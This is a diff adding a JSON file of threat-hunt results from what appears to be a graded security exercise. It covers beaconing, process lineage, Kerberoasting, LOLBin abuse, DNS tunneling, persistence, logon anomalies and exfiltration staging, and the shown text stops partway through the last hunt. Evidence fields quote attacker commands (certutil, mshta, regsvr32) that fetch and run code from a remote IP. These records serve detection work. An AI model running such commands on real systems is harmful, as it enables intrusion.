@@ -1,0 +1,1074 @@
+{
+  "H01": {
+    "findings": [
+      {
+        "entity": "WKS-0042 -> cdn-sync-07.telemetry-edge.example",
+        "evidence": {
+          "bytes_out_cv": 0.028,
+          "connections": 3037,
+          "dst_domain": "cdn-sync-07.telemetry-edge.example",
+          "host": "WKS-0042",
+          "in_band_fraction": 0.998,
+          "interval_cv": 0.117,
+          "mean_bytes_out": 779.5,
+          "median_interval_s": 301.2,
+          "raw_score": 80.84,
+          "robust_cv": 0.148,
+          "sanctioned": null
+        },
+        "explanation": "3037 conns, median 301s, CV 0.12, robust CV 0.15, 100% of intervals in +/-30% band, bytes_out CV 0.03",
+        "score": 80.84,
+        "verdict": "malicious"
+      },
+      {
+        "entity": "WKS-0040 -> fonts.gstatic.example",
+        "evidence": {
+          "bytes_out_cv": 0.546,
+          "connections": 20,
+          "dst_domain": "fonts.gstatic.example",
+          "host": "WKS-0040",
+          "in_band_fraction": 0.526,
+          "interval_cv": 0.727,
+          "mean_bytes_out": 2157.0,
+          "median_interval_s": 74226.5,
+          "raw_score": 7.12,
+          "robust_cv": 0.415,
+          "sanctioned": null
+        },
+        "explanation": "20 conns, median 74226s, CV 0.73, robust CV 0.42, 53% of intervals in +/-30% band, bytes_out CV 0.55",
+        "score": 7.124,
+        "verdict": "benign"
+      },
+      {
+        "entity": "WKS-0043 -> time.ntp-pool.example",
+        "evidence": {
+          "bytes_out_cv": 0.021,
+          "connections": 319,
+          "dst_domain": "time.ntp-pool.example",
+          "host": "WKS-0043",
+          "in_band_fraction": 0.959,
+          "interval_cv": 2.138,
+          "mean_bytes_out": 89.5,
+          "median_interval_s": 2055.9,
+          "raw_score": 95.38,
+          "robust_cv": 0.02,
+          "sanctioned": "Windows Time service"
+        },
+        "explanation": "319 conns, median 2056s, CV 2.14, robust CV 0.02, 96% of intervals in +/-30% band, bytes_out CV 0.02; sanctioned: Windows Time service (fixed 2048s NTP poll) -> suppressed",
+        "score": 4.769,
+        "verdict": "benign"
+      },
+      {
+        "entity": "WKS-0036 -> time.ntp-pool.example",
+        "evidence": {
+          "bytes_out_cv": 0.021,
+          "connections": 321,
+          "dst_domain": "time.ntp-pool.example",
+          "host": "WKS-0036",
+          "in_band_fraction": 0.959,
+          "interval_cv": 2.136,
+          "mean_bytes_out": 89.5,
+          "median_interval_s": 2046.6,
+          "raw_score": 95.33,
+          "robust_cv": 0.021,
+          "sanctioned": "Windows Time service"
+        },
+        "explanation": "321 conns, median 2047s, CV 2.14, robust CV 0.02, 96% of intervals in +/-30% band, bytes_out CV 0.02; sanctioned: Windows Time service (fixed 2048s NTP poll) -> suppressed",
+        "score": 4.766,
+        "verdict": "benign"
+      },
+      {
+        "entity": "WKS-0022 -> time.ntp-pool.example",
+        "evidence": {
+          "bytes_out_cv": 0.024,
+          "connections": 320,
+          "dst_domain": "time.ntp-pool.example",
+          "host": "WKS-0022",
+          "in_band_fraction": 0.959,
+          "interval_cv": 2.141,
+          "mean_bytes_out": 89.5,
+          "median_interval_s": 2048.1,
+          "raw_score": 95.31,
+          "robust_cv": 0.02,
+          "sanctioned": "Windows Time service"
+        },
+        "explanation": "320 conns, median 2048s, CV 2.14, robust CV 0.02, 96% of intervals in +/-30% band, bytes_out CV 0.02; sanctioned: Windows Time service (fixed 2048s NTP poll) -> suppressed",
+        "score": 4.765,
+        "verdict": "benign"
+      },
+      {
+        "entity": "WKS-0057 -> time.ntp-pool.example",
+        "evidence": {
+          "bytes_out_cv": 0.023,
+          "connections": 320,
+          "dst_domain": "time.ntp-pool.example",
+          "host": "WKS-0057",
+          "in_band_fraction": 0.959,
+          "interval_cv": 2.139,
+          "mean_bytes_out": 89.4,
+          "median_interval_s": 2050.5,
+          "raw_score": 95.23,
+          "robust_cv": 0.021,
+          "sanctioned": "Windows Time service"
+        },
+        "explanation": "320 conns, median 2051s, CV 2.14, robust CV 0.02, 96% of intervals in +/-30% band, bytes_out CV 0.02; sanctioned: Windows Time service (fixed 2048s NTP poll) -> suppressed",
+        "score": 4.761,
+        "verdict": "benign"
+      },
+      {
+        "entity": "WKS-0020 -> time.ntp-pool.example",
+        "evidence": {
+          "bytes_out_cv": 0.022,
+          "connections": 320,
+          "dst_domain": "time.ntp-pool.example",
+          "host": "WKS-0020",
+          "in_band_fraction": 0.959,
+          "interval_cv": 2.132,
+          "mean_bytes_out": 89.6,
+          "median_interval_s": 2057.6,
+          "raw_score": 95.23,
+          "robust_cv": 0.021,
+          "sanctioned": "Windows Time service"
+        },
+        "explanation": "320 conns, median 2058s, CV 2.13, robust CV 0.02, 96% of intervals in +/-30% band, bytes_out CV 0.02; sanctioned: Windows Time service (fixed 2048s NTP poll) -> suppressed",
+        "score": 4.761,
+        "verdict": "benign"
+      },
+      {
+        "entity": "WKS-0005 -> time.ntp-pool.example",
+        "evidence": {
+          "bytes_out_cv": 0.023,
+          "connections": 320,
+          "dst_domain": "time.ntp-pool.example",
+          "host": "WKS-0005",
+          "in_band_fraction": 0.959,
+          "interval_cv": 2.137,
+          "mean_bytes_out": 89.3,
+          "median_interval_s": 2051.1,
+          "raw_score": 95.19,
+          "robust_cv": 0.021,
+          "sanctioned": "Windows Time service"
+        },
+        "explanation": "320 conns, median 2051s, CV 2.14, robust CV 0.02, 96% of intervals in +/-30% band, bytes_out CV 0.02; sanctioned: Windows Time service (fixed 2048s NTP poll) -> suppressed",
+        "score": 4.76,
+        "verdict": "benign"
+      },
+      {
+        "entity": "WKS-0033 -> time.ntp-pool.example",
+        "evidence": {
+          "bytes_out_cv": 0.022,
+          "connections": 321,
+          "dst_domain": "time.ntp-pool.example",
+          "host": "WKS-0033",
+          "in_band_fraction": 0.959,
+          "interval_cv": 2.133,
+          "mean_bytes_out": 89.6,
+          "median_interval_s": 2053.8,
+          "raw_score": 95.16,
+          "robust_cv": 0.022,
+          "sanctioned": "Windows Time service"
+        },
+        "explanation": "321 conns, median 2054s, CV 2.13, robust CV 0.02, 96% of intervals in +/-30% band, bytes_out CV 0.02; sanctioned: Windows Time service (fixed 2048s NTP poll) -> suppressed",
+        "score": 4.758,
+        "verdict": "benign"
+      },
+      {
+        "entity": "WKS-0048 -> time.ntp-pool.example",
+        "evidence": {
+          "bytes_out_cv": 0.024,
+          "connections": 320,
+          "dst_domain": "time.ntp-pool.example",
+          "host": "WKS-0048",
+          "in_band_fraction": 0.959,
+          "interval_cv": 2.137,
+          "mean_bytes_out": 89.5,
+          "median_interval_s": 2049.3,
+          "raw_score": 95.16,
+          "robust_cv": 0.021,
+          "sanctioned": "Windows Time service"
+        },
+        "explanation": "320 conns, median 2049s, CV 2.14, robust CV 0.02, 96% of intervals in +/-30% band, bytes_out CV 0.02; sanctioned: Windows Time service (fixed 2048s NTP poll) -> suppressed",
+        "score": 4.758,
+        "verdict": "benign"
+      }
+    ],
+    "fp_review": [
+      "`updates.contoso-software.example` (Contoso Updater 4.2 (all endpoints), 60 hosts): median 183 conns, interval 3716s, CV 1.61, robust CV 0.40, 58% in band, raw score 38.0 (high interval CV / wide jitter) - excluded: domain is in the software inventory.",
+      "`time.ntp-pool.example` (Windows Time service, 60 hosts): median 320 conns, interval 2051s, CV 2.14, robust CV 0.02, 96% in band, raw score 95.0 (metronome-regular, would score as a beacon) - excluded: domain is in the software inventory.",
+      "`telemetry.vendor-apm.example` (Vendor APM agent (servers), 3 hosts): median 1342 conns, interval 899s, CV 0.05, robust CV 0.04, 100% in band, raw score 93.7 (metronome-regular, would score as a beacon) - excluded: domain is in the software inventory.",
+      "`sync.collab-suite.example` (Collab Suite file sync (15 endpoints), 14 hosts): median 4236 conns, interval 53s, CV 18.17, robust CV 1.03, 21% in band, raw score 0.0 (high interval CV / wide jitter) - excluded: domain is in the software inventory.",
+      "Naive frequency ranking (connection count) puts `WKS-0005 -> sync.collab-suite.example` first with 4365 connections; the top-scored pair ranks #15 of 559 by count. Counting finds chatty software, not beacons."
+    ],
+    "hunt_id": "H01",
+    "meta": {
+      "data_gaps": [
+        "No TLS JA3/JA4 or SNI fields in the proxy feed; client fingerprinting would cut review time."
+      ],
+      "data_sources": [
+        "network"
+      ],
+      "decision": "baseline documented, no detection",
+      "detection": null,
+      "entity": "host -> external domain",
+      "id": "H01",
+      "name": "C2 beaconing (inter-arrival statistics)",
+      "rationale": "Inter-arrival scoring needs days of history plus the sanctioned-software inventory. As a point-in-time rule it would either fire on NTP and APM telemetry (raw regularity scores in the 90s) or rest entirely on an allowlist. Kept as a weekly scheduled hunt (query.kql / query.spl) with the sanctioned-beacon baseline documented; the implant domain and IP went to the blocklist as IOCs.",
+      "technique": "T1071.001"
+    },
+    "score": {
+      "hunt_id": "H01",
+      "n_findings": 10,
+      "note": "",
+      "precision_at_malicious": 1.0,
+      "rank_of_first_tp": 1,
+      "technique": "T1071.001",
+      "top_entity": "WKS-0042 -> cdn-sync-07.telemetry-edge.example",
+      "top_is_tp": true,
+      "true_positive_found": true
+    }
+  },
+  "H02": {
+    "detection_proof": {
+      "alerts": 1,
+      "benign_baseline_alerts": 0,
+      "events_matched": 1,
+      "events_on_adversary": 1,
+      "fires_on_adversary": true,
+      "rule_id": "H02-office-shell-lolbin",
+      "source": "process",
+      "title": "Office Application Spawning Shell Into Signed Proxy Binary"
+    },
+    "findings": [
+      {
+        "entity": "excel.exe -> cmd.exe -> rundll32.exe",
+        "evidence": {
+          "events": 1,
+          "example_cmdline": "rundll32.exe C:\\Users\\rbaxter\\AppData\\Local\\Temp\\u3d9a.dll,Start",
+          "example_host": "WKS-0042",
+          "host_count": 1,
+          "hosts": [
+            "WKS-0042"
+          ],
+          "lineage": "excel.exe -> cmd.exe -> rundll32.exe"
+        },
+        "explanation": "seen on 1 host(s), 1 event(s); office app -> shell; shell -> LOLBin; image/args in user-writable path",
+        "score": 100.0,
+        "verdict": "malicious"
+      },
+      {
+        "entity": "cmd.exe -> cmd.exe -> mshta.exe",
+        "evidence": {
+          "events": 1,
+          "example_cmdline": "mshta.exe http://198.51.100.23/a.hta",
+          "example_host": "WKS-0042",
+          "host_count": 1,
+          "hosts": [
+            "WKS-0042"
+          ],
+          "lineage": "cmd.exe -> cmd.exe -> mshta.exe"
+        },
+        "explanation": "seen on 1 host(s), 1 event(s); shell -> LOLBin",
+        "score": 43.333,
+        "verdict": "suspicious"
+      },
+      {
+        "entity": "cmd.exe -> cmd.exe -> regsvr32.exe",
+        "evidence": {
+          "events": 1,
+          "example_cmdline": "regsvr32.exe /s /n /u /i:http://198.51.100.23/x.sct scrobj.dll",
+          "example_host": "WKS-0042",
+          "host_count": 1,
+          "hosts": [
+            "WKS-0042"
+          ],
+          "lineage": "cmd.exe -> cmd.exe -> regsvr32.exe"
+        },
+        "explanation": "seen on 1 host(s), 1 event(s); shell -> LOLBin",
+        "score": 43.333,
+        "verdict": "suspicious"
+      },
+      {
+        "entity": "explorer.exe -> excel.exe -> cmd.exe",
+        "evidence": {
+          "events": 1,
+          "example_cmdline": "cmd.exe /c rundll32",
+          "example_host": "WKS-0042",
+          "host_count": 1,
+          "hosts": [
+            "WKS-0042"
+          ],
+          "lineage": "explorer.exe -> excel.exe -> cmd.exe"
+        },
+        "explanation": "seen on 1 host(s), 1 event(s); rare lineage",
+        "score": 16.667,
+        "verdict": "suspicious"
+      },
+      {
+        "entity": "explorer.exe -> cmd.exe -> nmap.exe",
+        "evidence": {
+          "events": 1,
+          "example_cmdline": "nmap.exe /accepteula",
+          "example_host": "WKS-0027",
+          "host_count": 1,
+          "hosts": [
+            "WKS-0027"
+          ],
+          "lineage": "explorer.exe -> cmd.exe -> nmap.exe"
+        },
+        "explanation": "seen on 1 host(s), 1 event(s); admin tool on admin host -> documented FP",
+        "score": 2.5,
+        "verdict": "benign"
+      },
+      {
+        "entity": "explorer.exe -> cmd.exe -> psexec.exe",
+        "evidence": {
+          "events": 2,
+          "example_cmdline": "psexec.exe /accepteula",
+          "example_host": "WKS-0027",
+          "host_count": 2,
+          "hosts": [
+            "WKS-0011",
+            "WKS-0027"
+          ],
+          "lineage": "explorer.exe -> cmd.exe -> psexec.exe"
+        },
+        "explanation": "seen on 2 host(s), 2 event(s); admin tool on admin host -> documented FP",
+        "score": 2.188,
+        "verdict": "benign"
+      },
+      {
+        "entity": "explorer.exe -> cmd.exe -> wireshark.exe",
+        "evidence": {
+          "events": 3,
+          "example_cmdline": "wireshark.exe /accepteula",
+          "example_host": "WKS-0003",
+          "host_count": 2,
+          "hosts": [
+            "WKS-0003",
+            "WKS-0011"
+          ],
+          "lineage": "explorer.exe -> cmd.exe -> wireshark.exe"
+        },
+        "explanation": "seen on 2 host(s), 3 event(s); admin tool on admin host -> documented FP",
+        "score": 2.188,
+        "verdict": "benign"
+      },
+      {
+        "entity": "explorer.exe -> cmd.exe -> procmon.exe",
+        "evidence": {
+          "events": 3,
+          "example_cmdline": "procmon.exe /accepteula",
+          "example_host": "WKS-0011",
+          "host_count": 3,
+          "hosts": [
+            "WKS-0003",
+            "WKS-0011",
+            "WKS-0027"
+          ],
+          "lineage": "explorer.exe -> cmd.exe -> procmon.exe"
+        },
+        "explanation": "seen on 3 host(s), 3 event(s); admin tool on admin host -> documented FP",
+        "score": 1.875,
+        "verdict": "benign"
+      }
+    ],
+    "fp_review": [
+      "`nmap.exe` ran on 1 host(s) (WKS-0027) - IT admin workstations, launched from explorer/cmd, not from an Office parent -> documented FP, down-weighted x0.15.",
+      "`procmon.exe` ran on 3 host(s) (WKS-0003, WKS-0011, WKS-0027) - IT admin workstations, launched from explorer/cmd, not from an Office parent -> documented FP, down-weighted x0.15.",
+      "`psexec.exe` ran on 2 host(s) (WKS-0011, WKS-0027) - IT admin workstations, launched from explorer/cmd, not from an Office parent -> documented FP, down-weighted x0.15.",
+      "`wireshark.exe` ran on 2 host(s) (WKS-0003, WKS-0011) - IT admin workstations, launched from explorer/cmd, not from an Office parent -> documented FP, down-weighted x0.15.",
+      "20 distinct gparent->parent->child lineages across 65 hosts; the head of the distribution (svchost, chrome, teams, Office from explorer/outlook) is on every host."
+    ],
+    "hunt_id": "H02",
+    "meta": {
+      "data_gaps": [],
+      "data_sources": [
+        "process"
+      ],
+      "decision": "new detection created",
+      "detection": "H02-office-shell-lolbin",
+      "entity": "gparent->parent->child lineage",
+      "id": "H02",
+      "name": "Rare process lineage (fleet stacking)",
+      "rationale": "The office -> shell -> signed-proxy-binary lineage occurred once in 14 days across 65 hosts and never in the benign baseline. It is expressible as a single-event Sigma rule with no allowlist.",
+      "technique": "T1204.002"
+    },
+    "score": {
+      "hunt_id": "H02",
+      "n_findings": 8,
+      "note": "",
+      "precision_at_malicious": 1.0,
+      "rank_of_first_tp": 1,
+      "technique": "T1204.002",
+      "top_entity": "excel.exe -> cmd.exe -> rundll32.exe",
+      "top_is_tp": true,
+      "true_positive_found": true
+    }
+  },
+  "H03": {
+    "detection_proof": {
+      "alerts": 1,
+      "benign_baseline_alerts": 0,
+      "events_matched": 9,
+      "events_on_adversary": 9,
+      "fires_on_adversary": true,
+      "rule_id": "H03-kerberoasting-rc4-burst",
+      "source": "auth",
+      "title": "Kerberoasting - RC4 TGS Burst For Many SPNs"
+    },
+    "findings": [
+      {
+        "entity": "rbaxter",
+        "evidence": {
+          "burst_span_s": 143.9,
+          "peak_distinct_rc4_spns": 9,
+          "rc4_tgs_total": 9,
+          "user": "rbaxter",
+          "window_spns": [
+            "CIFS/fs01.northwind.example",
+            "FTP/transfer.northwind.example",
+            "HOST/srv03.northwind.example",
+            "HTTP/portal.northwind.example",
+            "HTTP/web01.northwind.example",
+            "LDAP/dc01.northwind.example",
+            "MSSQLSvc/srv01.northwind.example:1433",
+            "MSSQLSvc/srv02.northwind.example:1433",
+            "TERMSRV/vdi01.northwind.example"
+          ]
+        },
+        "explanation": "peak 9 distinct RC4 SPNs within 600s (burst span 144s); 9 RC4 TGS total",
+        "score": 100.0,
+        "verdict": "malicious"
+      }
+    ],
+    "fp_review": [
+      "`svc-legacy`: 63 RC4 TGS over 14 days, all for 1 SPN (MSSQLSvc/srv01.northwind.example:1433) - legacy application that cannot do AES; peak distinct SPNs 1 -> below threshold. Ticketed for AES migration.",
+      "66 accounts requested AES (0x12) tickets for 1-3 SPNs/day - normal service access, ignored."
+    ],
+    "hunt_id": "H03",
+    "meta": {
+      "data_gaps": [],
+      "data_sources": [
+        "auth"
+      ],
+      "decision": "new detection created",
+      "detection": "H03-kerberoasting-rc4-burst",
+      "entity": "account",
+      "id": "H03",
+      "name": "Kerberoasting (RC4 TGS burst)",
+      "rationale": "Distinct RC4 SPNs per account per 10 minutes separates the roast (9) from every benign account (max 1). Graduated as a Sigma correlation rule; svc-legacy is the only RC4 user and stays below threshold.",
+      "technique": "T1558.003"
+    },
+    "score": {
+      "hunt_id": "H03",
+      "n_findings": 1,
+      "note": "",
+      "precision_at_malicious": 1.0,
+      "rank_of_first_tp": 1,
+      "technique": "T1558.003",
+      "top_entity": "rbaxter",
+      "top_is_tp": true,
+      "true_positive_found": true
+    }
+  },
+  "H04": {
+    "detection_proof": {
+      "alerts": 3,
+      "benign_baseline_alerts": 0,
+      "events_matched": 3,
+      "events_on_adversary": 3,
+      "fires_on_adversary": true,
+      "rule_id": "H04-lolbin-remote-fetch",
+      "source": "process",
+      "title": "LOLBin Remote Payload Fetch Or Scriptlet Execution"
+    },
+    "findings": [
+      {
+        "entity": "WKS-0042 / certutil.exe",
+        "evidence": {
+          "binary": "certutil.exe",
+          "cmdline": "certutil.exe -urlcache -split -f http://198.51.100.23/update.txt %TEMP%\\u.txt",
+          "host": "WKS-0042",
+          "host_baseline_runs": 1,
+          "pattern": "certutil remote download",
+          "ts": "2026-09-10T10:16:40Z",
+          "user": "rbaxter"
+        },
+        "explanation": "certutil remote download; host baseline 1 run(s) of certutil.exe",
+        "score": 100.0,
+        "verdict": "malicious"
+      },
+      {
+        "entity": "WKS-0042 / mshta.exe",
+        "evidence": {
+          "binary": "mshta.exe",
+          "cmdline": "mshta.exe http://198.51.100.23/a.hta",
+          "host": "WKS-0042",
+          "host_baseline_runs": 1,
+          "pattern": "mshta remote/script execution",
+          "ts": "2026-09-10T10:17:40Z",
+          "user": "rbaxter"
+        },
+        "explanation": "mshta remote/script execution; host baseline 1 run(s) of mshta.exe",
+        "score": 100.0,
+        "verdict": "malicious"
+      },
+      {
+        "entity": "WKS-0042 / regsvr32.exe",
+        "evidence": {
+          "binary": "regsvr32.exe",
+          "cmdline": "regsvr32.exe /s /n /u /i:http://198.51.100.23/x.sct scrobj.dll",
+          "host": "WKS-0042",
+          "host_baseline_runs": 1,
+          "pattern": "regsvr32 remote scriptlet (Squiblydoo)",
+          "ts": "2026-09-10T10:17:10Z",
+          "user": "rbaxter"
+        },
+        "explanation": "regsvr32 remote scriptlet (Squiblydoo); host baseline 1 run(s) of regsvr32.exe",
+        "score": 100.0,
+        "verdict": "malicious"
+      }
+    ],
+    "fp_review": [
+      "`certutil.exe -store my` x6 - certutil.exe with no network or scriptlet argument -> baseline use, not matched.",
+      "`certutil.exe -verify ca.cer` x3 - certutil.exe with no network or scriptlet argument -> baseline use, not matched.",
+      "`regsvr32.exe /s \"C:\\Program Files\\Contoso\\shellext.dll\"` x3 - regsvr32.exe with no network or scriptlet argument -> baseline use, not matched.",
+      "`rundll32.exe C:\\Users\\rbaxter\\AppData\\Local\\Temp\\u3d9a.dll,Start` x1 - no network argument, so out of scope for H04, but a DLL in a user temp path is not baseline: pivoted to H02 (lineage), where it ranks #1."
+    ],
+    "hunt_id": "H04",
+    "meta": {
+      "data_gaps": [],
+      "data_sources": [
+        "process"
+      ],
+      "decision": "new detection created",
+      "detection": "H04-lolbin-remote-fetch",
+      "entity": "host / binary / command",
+      "id": "H04",
+      "name": "LOLBin abuse (command-line patterns)",
+      "rationale": "The abuse is in the network argument, not the binary. Baseline certutil/regsvr32 use carries no URL, so a binary + command-line-pattern rule fires only on the abuse.",
+      "technique": "T1105"
+    },
+    "score": {
+      "hunt_id": "H04",
+      "n_findings": 3,
+      "note": "",
+      "precision_at_malicious": 1.0,
+      "rank_of_first_tp": 1,
+      "technique": "T1105",
+      "top_entity": "WKS-0042 / certutil.exe",
+      "top_is_tp": true,
+      "true_positive_found": true
+    }
+  },
+  "H05": {
+    "findings": [
+      {
+        "entity": "dataxfil-svc.example",
+        "evidence": {
+          "is_known_cdn": false,
+          "mean_entropy_bits": 4.367,
+          "mean_label_length": 36.78,
+          "query_volume": 239,
+          "registered_domain": "dataxfil-svc.example",
+          "txt_queries": 239,
+          "unique_subdomains": 239
+        },
+        "explanation": "239 unique subdomains, mean label len 36.8, mean entropy 4.37 bits/char, 239 queries",
+        "score": 97.403,
+        "verdict": "malicious"
+      },
+      {
+        "entity": "akamai-cdn.example",
+        "evidence": {
+          "is_known_cdn": true,
+          "mean_entropy_bits": 2.269,
+          "mean_label_length": 6.06,
+          "query_volume": 1664,
+          "registered_domain": "akamai-cdn.example",
+          "txt_queries": 0,
+          "unique_subdomains": 1663
+        },
+        "explanation": "1663 unique subdomains, mean label len 6.1, mean entropy 2.27 bits/char, 1664 queries, known CDN -> suppressed",
+        "score": 3.0,
+        "verdict": "benign"
+      },
+      {
+        "entity": "cloudfront-dist.example",
+        "evidence": {
+          "is_known_cdn": true,
+          "mean_entropy_bits": 2.249,
+          "mean_label_length": 5.98,
+          "query_volume": 1702,
+          "registered_domain": "cloudfront-dist.example",
+          "txt_queries": 0,
+          "unique_subdomains": 1702
+        },
+        "explanation": "1702 unique subdomains, mean label len 6.0, mean entropy 2.25 bits/char, 1702 queries, known CDN -> suppressed",
+        "score": 3.0,
+        "verdict": "benign"
+      }
+    ],
+    "fp_review": [
+      "`akamai-cdn.example`: 1663 unique subdomains (high cardinality) but mean label length 6.06 and entropy 2.269 bits/char - CDN edge hostnames, known CDN -> suppressed x0.1.",
+      "`cloudfront-dist.example`: 1702 unique subdomains (high cardinality) but mean label length 5.98 and entropy 2.249 bits/char - CDN edge hostnames, known CDN -> suppressed x0.1.",
+      "Every other registered domain had fewer than 10 unique subdomains and was not scored."
+    ],
+    "hunt_id": "H05",
+    "meta": {
+      "data_gaps": [
+        "DNS resolver logs lack response size / answer payload for TXT queries (backlog H11)."
+      ],
+      "data_sources": [
+        "dns"
+      ],
+      "decision": "data gap found",
+      "detection": null,
+      "entity": "registered domain",
+      "id": "H05",
+      "name": "DNS tunneling (subdomain entropy/cardinality)",
+      "rationale": "The tunnel was found, but resolver logs record query name and type only: no response size or TXT answer data. The strongest tunneling signal (bytes carried per domain) cannot be measured, and an always-on rule would rest on label length alone. Gap logged as backlog H11; hunt stays weekly.",
+      "technique": "T1048.003"
+    },
+    "score": {
+      "hunt_id": "H05",
+      "n_findings": 3,
+      "note": "",
+      "precision_at_malicious": 1.0,
+      "rank_of_first_tp": 1,
+      "technique": "T1048.003",
+      "top_entity": "dataxfil-svc.example",
+      "top_is_tp": true,
+      "true_positive_found": true
+    }
+  },
+  "H06": {
+    "detection_proof": {
+      "alerts": 1,
+      "benign_baseline_alerts": 0,
+      "events_matched": 1,
+      "events_on_adversary": 1,
+      "fires_on_adversary": true,
+      "rule_id": "H06-service-user-writable-path",
+      "source": "service",
+      "title": "New Service With Image In User-Writable Path"
+    },
+    "findings": [
+      {
+        "entity": "WinSyncHelper",
+        "evidence": {
+          "account": "LocalSystem",
+          "event_id": 7045,
+          "first_seen": "2026-09-10T10:20:00Z",
+          "host_count": 1,
+          "hosts": [
+            "WKS-0042"
+          ],
+          "image_path": "C:\\Users\\rbaxter\\AppData\\Local\\Temp\\wsh.exe",
+          "name": "WinSyncHelper",
+          "sha256": "cb10b4f380e7d2fcb737810e08ead80c2e271b08f82491b0c514047e8ac31966"
+        },
+        "explanation": "on 1 host(s); binary in user-writable path; name imitates a system component; first seen 3.3d after fleet baseline",
+        "score": 96.693,
+        "verdict": "malicious"
+      },
+      {
+        "entity": "FinanceLedger Sync",
+        "evidence": {
+          "account": "svc-sql",
+          "event_id": 7045,
+          "first_seen": "2026-09-08T04:25:19Z",
+          "host_count": 1,
+          "hosts": [
+            "SRV-0002"
+          ],
+          "image_path": "C:\\Program Files\\FinLedger\\sync.exe",
+          "name": "FinanceLedger Sync",
+          "sha256": "9a9329e8eefb63c1e63ef9f0e1f260b2384a5ad8dab60dea28b7ea9624950eb0"
+        },
+        "explanation": "on 1 host(s); name imitates a system component; first seen 1.1d after fleet baseline; managed install path (Program Files/System32) -> down-weighted",
+        "score": 18.892,
+        "verdict": "benign"
+      },
+      {
+        "entity": "\\NW-IT\\InventoryScan",
+        "evidence": {
+          "account": "SYSTEM",
+          "event_id": 4698,
+          "first_seen": "2026-09-07T09:08:40Z",
+          "host_count": 3,
+          "hosts": [
+            "WKS-0003",
+            "WKS-0011",
+            "WKS-0027"
+          ],
+          "image_path": "C:\\Program Files\\NW-IT\\invscan.exe",
+          "name": "\\NW-IT\\InventoryScan",
+          "sha256": "dec9ec26332582ee4093559a76fd63632f1ce73fdab2673efa1c1b1fd17f49f9"
+        },
+        "explanation": "on 3 host(s); managed install path (Program Files/System32) -> down-weighted",
+        "score": 4.078,
+        "verdict": "benign"
+      }
+    ],
+    "fp_review": [
+      "`FinanceLedger Sync`: 1 host(s), `C:\\Program Files\\FinLedger\\sync.exe`, account svc-sql, first seen 2026-09-08T04:25:19Z - managed install path, confirmed with the owning team (line-of-business / IT tooling) -> benign.",
+      "`\\NW-IT\\InventoryScan`: 3 host(s), `C:\\Program Files\\NW-IT\\invscan.exe`, account SYSTEM, first seen 2026-09-07T09:08:40Z - managed install path, confirmed with the owning team (line-of-business / IT tooling) -> benign.",
+      "4 service/task names are present on more than 3 hosts (managed deployments) and were not scored."
+    ],
+    "hunt_id": "H06",
+    "meta": {
+      "data_gaps": [
+        "Service creation events carry no signer/publisher field; hash reputation is manual."
+      ],
+      "data_sources": [
+        "service"
+      ],
+      "decision": "new detection created",
+      "detection": "H06-service-user-writable-path",
+      "entity": "service/task name",
+      "id": "H06",
+      "name": "Fleet-rare persistence (service/task stacking)",
+      "rationale": "Every sanctioned service and task runs from Program Files or System32; the only service with a user-writable image path was the implant. Graduated as a path-based Sigma rule; fleet stacking stays a monthly hunt for rare services in managed paths.",
+      "technique": "T1543.003"
+    },
+    "score": {
+      "hunt_id": "H06",
+      "n_findings": 3,
+      "note": "",
+      "precision_at_malicious": 1.0,
+      "rank_of_first_tp": 1,
+      "technique": "T1543.003",
+      "top_entity": "WinSyncHelper",
+      "top_is_tp": true,
+      "true_positive_found": true
+    }
+  },
+  "H07": {
+    "detection_proof": {
+      "alerts": 1,
+      "benign_baseline_alerts": 0,
+      "events_matched": 1,
+      "events_on_adversary": 1,
+      "fires_on_adversary": true,
+      "rule_id": "H07-service-account-interactive-logon",
+      "source": "auth",
+      "title": "Service Account Interactive Logon"
+    },
+    "findings": [
+      {
+        "entity": "svc-backup",
+        "evidence": {
+          "anomaly": {
+            "host": "SRV-0001",
+            "hour": 2,
+            "hour_mad_z": 2.7,
+            "logon_type": 10,
+            "off_hours": true,
+            "src_ip": "10.20.42.42",
+            "ts": "2026-09-13T02:10:00Z"
+          },
+          "baseline_logon_types": [
+            5,
+            10
+          ],
+          "interactive_fraction": 0.02,
+          "interactive_logons": 1,
+          "total_logons": 50,
+          "user": "svc-backup"
+        },
+        "explanation": "interactive logon (type 10) is 2% of this account's history at 02:00 (off-hours)",
+        "score": 99.75,
+        "verdict": "malicious"
+      }
+    ],
+    "fp_review": [
+      "`achen`: 1 off-hours interactive logon(s) on own workstation, but interactive logons are 28% of the account's history -> within baseline, not a novelty.",
+      "`svc-legacy`: 52 logons, types [5] - non-interactive only -> consistent with baseline.",
+      "`svc-scan`: 91 logons, types [3, 5], 42 of them between 00:00-06:00 (scheduled jobs) - non-interactive only -> consistent with baseline.",
+      "`svc-sql`: 57 logons, types [5] - non-interactive only -> consistent with baseline.",
+      "`svc-web`: 45 logons, types [5] - non-interactive only -> consistent with baseline."
+    ],
+    "hunt_id": "H07",
+    "meta": {
+      "data_gaps": [],
+      "data_sources": [
+        "auth"
+      ],
+      "decision": "new detection created",
+      "detection": "H07-service-account-interactive-logon",
+      "entity": "account",
+      "id": "H07",
+      "name": "Anomalous logon behaviour (per-account baseline)",
+      "rationale": "No service account had an interactive logon in the baseline. 'svc-* with logon type 2/10/11' is a zero-baseline condition, so it graduates as a simple rule; the per-account hour baseline remains a hunt.",
+      "technique": "T1078.002"
+    },
+    "score": {
+      "hunt_id": "H07",
+      "n_findings": 1,
+      "note": "",
+      "precision_at_malicious": 1.0,
+      "rank_of_first_tp": 1,
+      "technique": "T1078.002",
+      "top_entity": "svc-backup",
+      "top_is_tp": true,
+      "true_positive_found": true
+    }
+  },
+  "H08": {
+    "detection_proof": {
+      "alerts": 1,
+      "benign_baseline_alerts": 0,
+      "events_matched": 1,
+      "events_on_adversary": 1,
+      "fires_on_adversary": true,
+      "rule_id": "H08-archive-staging-path",
+      "source": "files",
+      "title": "Archive Written To Suspicious Staging Path"
+    },
+    "findings": [
+      {
+        "entity": "WKS-0042 / archive.7z",
+        "evidence": {
+          "archive": "C:\\PerfLogs\\archive.7z",
+          "archive_size": 326743099,
+          "baseline_p95": 1350.4,
+          "destination": "eu-west.cloudbox-storage.example",
+          "external": true,
+          "external_bytes": 266064067,
+          "host": "WKS-0042",
+          "internal_bytes": 0,
+          "off_hours": true,
+          "ratio": 197026.1,
+          "suspicious_path": true,
+          "ts": "2026-09-16T01:05:00Z",
+          "user": "rbaxter"
+        },
+        "explanation": "archive.7z (327 MB) created in C:\\PerfLogs\\archive.7z, then 266 MB egress within 30m (197,026x host p95) to EXTERNAL eu-west.cloudbox-storage.example; off-hours",
+        "score": 100.0,
+        "verdict": "malicious"
+      },
+      {
+        "entity": "SRV-0001 / nightly-00.7z",
